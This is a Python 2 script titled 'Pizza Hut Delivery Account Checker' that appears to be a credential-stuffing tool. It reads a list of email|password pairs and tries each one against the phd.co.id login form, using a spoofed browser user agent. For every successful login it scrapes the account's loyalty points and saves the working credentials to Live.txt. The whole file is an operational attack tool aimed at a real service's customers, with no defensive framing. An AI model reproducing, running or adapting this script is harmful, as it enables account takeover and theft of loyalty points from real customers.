#!/usr/bin/python2.7
from bs4 import BeautifulSoup as Bs
from mechanize import Browser
from time import sleep
import mechanize, cookielib, requests, sys, os
banner ="""
[ PIZZA HUT DELIVERY ACCOUNT CHECKER ]
	  [ Coded by VRX ]
--------------------------------------
"""
def main():
	live = []
	os.system('clear')
	print banner
	try:
		list = raw_input('[+] List Empas: ')
		print"[!] please wait..."
		print
		a= open(list).readlines()
		
		for x in a:
			
			br = Browser()
			cokie = cookielib.LWPCookieJar()
			br.set_handle_equiv(True)
			br.set_handle_gzip(True)
			br.set_handle_redirect(True)
			br.set_handle_referer(True)
			br.set_handle_robots(False)
			br.set_cookiejar(cokie)
			br.addheaders = [
			
			("Origin", "https://www.phd.co.id"),
			("User-Agent", "Mozilla/5.0 (Linux; Android 5.1.1; AFTT Build/LVY48F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/49.0.2623.10"),
			("Referer", "https://www.phd.co.id/en/users/login/1"),
			("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
			
			]
			us = x.strip().split('|')[0]
			ps = x.strip().split('|')[1]
			
			url = 'https://www.phd.co.id/en/users/login/1'
			br.open(url)
			br.select_form(nr=0)
			br.form['username']=str(us)
			br.form['password']=str(ps)
			
			a = live
			
			if br.submit().geturl() == 'https://www.phd.co.id/en/users/welcome':
				x = br.open('https://www.phd.co.id/en/accounts').read()
				y = Bs(x,'html.parser')
				z = y.find('li', {'class' : 'owner-poin'}).text
				
				print('[\x1b[32mFOUND\x1b[37m] '+str(us)+'|'+str(ps)+' POIN : '+str(z[6:]))
				a.append(''+str(us)+'|'+str(ps)+' Poin: '+str(z[6:])+'\n')
			else:
				print('[\x1b[31mERROR\x1b[37m] '+str(us)+'|'+str(ps))
				
		b = ('\n'.join(live))
		c = open('Live.txt','w')
		c.write(b)
		print
		print('[*] Done...')
		print('[+] File Saved Live.txt')
		print('[+] Result Live : '+str(len(live)))
		c.close()
		
	except IOError:
		print
		print('[!] File not found')
		print
		
if __name__ == '__main__':
	main()